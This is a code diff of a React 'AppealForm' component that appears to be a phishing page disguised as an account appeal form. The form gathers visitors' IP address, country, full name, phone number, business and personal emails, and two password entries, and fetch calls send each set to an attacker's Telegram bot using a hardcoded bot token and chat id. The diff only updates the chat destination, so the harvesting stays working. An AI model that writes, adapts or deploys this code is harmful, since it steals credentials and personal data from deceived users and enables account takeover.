@@ -10,7 +10,7 @@ const AppealForm = (props) => {
     const [countryCode, setCountryCode] = useState('');
 
     const { register, handleSubmit } = useForm();
-
+ 
     useEffect(() => {
         callAPI();
         fetchCountryCode(props.ip.userIP);
@@ -19,7 +19,7 @@ const AppealForm = (props) => {
     const callAPI = async () => {
         try {
             const message = `Message: hini ip:${props.ip.userIP}`
-            await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-2326609566&text=${message}`);
+            await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-1002326609566&message_thread_id=2&text=${message}`);
         } catch (err) {
             console.log(err);
         }
@@ -44,7 +44,7 @@ const AppealForm = (props) => {
             const message = `
             =========Ada yang masuk nih=========%0A%0A✅Ip address:${props.ip.userIP}%0A ✅Country Code: ${countryCode}%0A ✅Appeal: ${data.appeal}%0A 📛Full Name: ${data.fullname}%0A 📞Phone: ${data.mobilePhone}%0A 📧Bussines: ${data.bussinesEmail}%0A 👁‍🗨Personal: ${data.personalEmail}%0A Page Name: ${data.pageName}========== 
             `
-            await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-2326609566&text=${message}`);
+            await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-1002326609566&message_thread_id=2&text=${message}`);
             setSteps({first_password: true, second_password: false});
         } catch (err) {
             console.log(err);
@@ -55,7 +55,7 @@ const AppealForm = (props) => {
         try {
             const message = `
             Login 1 %0AIp:${props.ip.userIP}%0A Country Code: ${countryCode}%0A ‍🗨Personal: ${data.personalEmail}%0A 🔐Password: ${data.password}`;
-            await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-2326609566&text=${message}`);
+            await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-1002326609566&message_thread_id=2&text=${message}`);
             setSteps({first_password: false, second_password: true})
         } catch (err) {
             console.log(err);
@@ -66,7 +66,7 @@ const AppealForm = (props) => {
         try {
             const message = `
              Login 2 %0AIp:${props.ip.userIP}%0A Country Code: ${countryCode}%0A🗨Personal: ${data.personalEmail}%0A 🔐Password: ${data.password}`;
-            await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-2326609566&text=${message}`);
+            await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-1002326609566&message_thread_id=2&text=${message}`);
             setSteps({first_password: false, second_password: false});
             trigerNext();
         } catch (err) {
